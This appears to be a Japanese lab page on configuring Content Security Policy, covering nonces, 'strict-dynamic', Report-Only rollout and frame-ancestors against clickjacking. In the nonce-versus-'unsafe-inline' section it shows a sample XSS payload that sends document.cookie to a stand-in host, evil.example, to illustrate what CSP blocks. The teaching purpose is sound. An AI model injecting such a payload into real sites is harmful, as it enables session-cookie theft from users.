CSP ディレクティブの全体像

CSP ディレクティブの優先順位: Content-Security-Policy: default-src 'self'; ← デフォルト（全リソース種別に適用） script-src 'nonce-abc123' ← スクリプトだけ個別指定（defaultより優先） 'strict-dynamic'; ← nonceで許可したスクリプトの動的ロードも許可 style-src 'self'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; ← iframe埋め込みをすべて禁止 base-uri 'self'; require-trusted-types-for 'script'; ❌ 危険: script-src 'unsafe-inline' → XSS攻撃がそのまま実行される ✅ 推奨: script-src 'nonce-{乱数}' 'strict-dynamic'

主要ディレクティブ一覧

default-src   全リソース種別のデフォルト
script-src    JavaScriptの読み込み元
style-src     CSSの読み込み元
img-src       画像の読み込み元
font-src      フォントの読み込み元
connect-src   fetch/XHRの接続先
frame-src     iframeの埋め込み元
frame-ancestors  自分自身をiframeで
             埋め込める親を制限

ソースキーワード

'self'          同一オリジンのみ許可
'none'          すべて禁止
'unsafe-inline' インラインを許可（危険）
'unsafe-eval'   eval()を許可（危険）
'nonce-xxx'     nonce属性が一致するのみ
'strict-dynamic' nonceスクリプトの動的
                ロードも許可
https:          全HTTPSオリジン許可
data:           data: URIを許可
CSPはHTTPレスポンスヘッダーまたはmetaタグで設定: このページはmetaタグでCSPを設定しています（<meta http-equiv="Content-Security-Policy" ...>）。 本番環境ではレスポンスヘッダーで設定するのが推奨です。 metaタグではframe-ancestorsは機能しないためご注意ください（ヘッダー設定が必要）。

実験 8-B: nonce方式 vs unsafe-inline

なぜ 'unsafe-inline' が危険で、nonce + 'strict-dynamic' が推奨されるのかを理解します。

❌ unsafe-inline（危険）

CSP: script-src 'unsafe-inline'

→ 正規のスクリプト:
  <script>initApp();</script> ✅ 実行

→ XSS攻撃（例: コメント欄等から注入）:
  <script>
    document.location='https://evil.example/'
      +'?c='+document.cookie
  </script> ← これも実行される！ 🔴

'unsafe-inline' は全インラインスクリプトを
許可するため、XSS攻撃も防げない

✅ nonce方式（安全）

CSP: script-src 'nonce-r4nd0m123'
           'strict-dynamic'

→ nonce付きスクリプト（サーバーが生成）:
  <script nonce="r4nd0m123">
    initApp();
  </script> ✅ 実行される

→ XSS攻撃（nonceなし）:
  <script>
    document.location='https://evil.example/'
  </script> ← ブロック！ ✅

nonceは毎リクエストごとに乱数生成（サーバー側）
攻撃者はnonceを予測できない
STEP 1 — このページのnonce値を確認

このページの <script> タグの nonce 属性を確認します。

← ボタンを押すと結果が表示されます
STEP 2 — strict-dynamic の役割を理解する
'strict-dynamic' とは:

nonceで許可されたスクリプトが動的に追加する
スクリプトも自動的に許可する仕組み。

// 例: nonce付きスクリプトから動的に外部JSをロード
<script nonce="r4nd0m123">
  const s = document.createElement('script');
  s.src = 'https://cdn.example.com/lib.js';
  document.head.appendChild(s);
  // → 'strict-dynamic' があれば許可される！
  // → なければ script-src に cdn.example.com を列挙必要
</script>

メリット: CDN URLをCSPに列挙する必要がなく管理が楽
// ただし: script-src に URL ホワイトリストがある場合、
// 'strict-dynamic' はそのホワイトリストを無視する
本番環境でのnonce生成: nonceはリクエストごとにサーバーサイドで乱数生成します。 Node.js の例: crypto.randomBytes(16).toString('base64') 同じnonceを使い回すと攻撃者に予測される可能性があります。 このページはデモ用に固定値 lab08demo を使用していますが、 本番では必ずランダム値を使用してください。
✅ nonce 導入のベストプラクティス
  1. サーバー側で毎リクエストごとに乱数を生成（暗号論的安全な乱数: crypto.randomBytes(16).toString('base64')）
  2. Report-Only モードで段階導入：まず Content-Security-Policy-Report-Only で違反を収集し、影響範囲を把握してから本番適用
  3. 'strict-dynamic' を併用：nonce で許可したスクリプトが動的に追加するスクリプトも自動許可される → CDN URL の列挙が不要
  4. require-trusted-types-for 'script'：DOM-based XSS の防御層を追加（CSP Level 3）

実験 8-C: Report-Only モード

Content-Security-Policy-Report-Only は、CSPを本番適用する前のテストに使うヘッダーです。 違反があってもリソースのブロックは行わず、Console にログを出力するだけです。

Report-Only の導入フロー: ステップ1: Report-Only で収集開始（本番に影響なし） ───────────────────────────────────────────────── Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint Reporting-Endpoints: csp-endpoint="https://example.com/csp-report" → ブラウザは違反を検出してもブロックしない → 違反レポートを https://example.com/csp-report に送信 → Console にも違反ログが表示される ステップ2: 違反が 0 になったら本番適用 ───────────────────────────────────────────────── Content-Security-Policy: default-src 'self'; report-to csp-endpoint → 違反が検出されるとリソースをブロック → ユーザーへの影響が出る前に十分テスト済み

実験 8-D: frame-ancestors（クリックジャッキング防止）

クリックジャッキング攻撃は、悪意のあるサイトが iframe でターゲットサイトを透明に表示し、 ユーザーに意図せずクリックさせる攻撃です。frame-ancestors でこれを防止できます。

クリックジャッキング攻撃の仕組み: 攻撃者のサイト（evil.example.com） ┌─────────────────────────────────────┐ │ "ここをクリックして景品をゲット！" ← ユーザーに見えるボタン │ ┌──────────────────────────────┐ │ │ │ 銀行サイト（透明iframe） │ │ │ │ [送金実行] ← 本当のボタン │ │ │ └──────────────────────────────┘ │ └─────────────────────────────────────┘ → ユーザーは景品ボタンをクリックしているつもりが 実際は銀行の「送金実行」を押している！ 対策: frame-ancestors 'none' で iframe 埋め込みを禁止

X-Frame-Options vs CSP frame-ancestors

X-Frame-Options CSP frame-ancestors
設定例 DENY / SAMEORIGIN frame-ancestors 'none' / 'self' / URLリスト
細粒度制御 ❌ 低い（2種類のみ） ✅ 高い（URLごとに許可可能）
複数オリジン許可 ❌ 不可 ✅ 可能（スペース区切りで複数指定）
推奨度 ⚠ レガシー ✅ 現在の標準
metaタグで有効 N/A（ヘッダーのみ） ❌ ヘッダーのみ有効
ブラウザサポート 全ブラウザ 全モダンブラウザ
STEP 1 — frame-ancestors の設定例
// すべての iframe 埋め込みを禁止（最も厳格）
Content-Security-Policy: frame-ancestors 'none'

// 同一オリジンのみ許可（自サイト内のiframeは可）
Content-Security-Policy: frame-ancestors 'self'

// 特定のパートナーサイトのみ許可
Content-Security-Policy:
  frame-ancestors 'self' https://partner.example.com

// レガシーな X-Frame-Options も併用（古いブラウザ対応）
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
このページも frame-ancestors 'none' が設定済み: このページのCSP metaタグには frame-ancestors 'none' が含まれています。 ただし、metaタグでは frame-ancestors は有効になりません（仕様上の制限）。 本番環境では必ずHTTPレスポンスヘッダーで設定してください。 OutSystems では SetResponseHeader("Content-Security-Policy", "frame-ancestors 'none'") で設定できます。
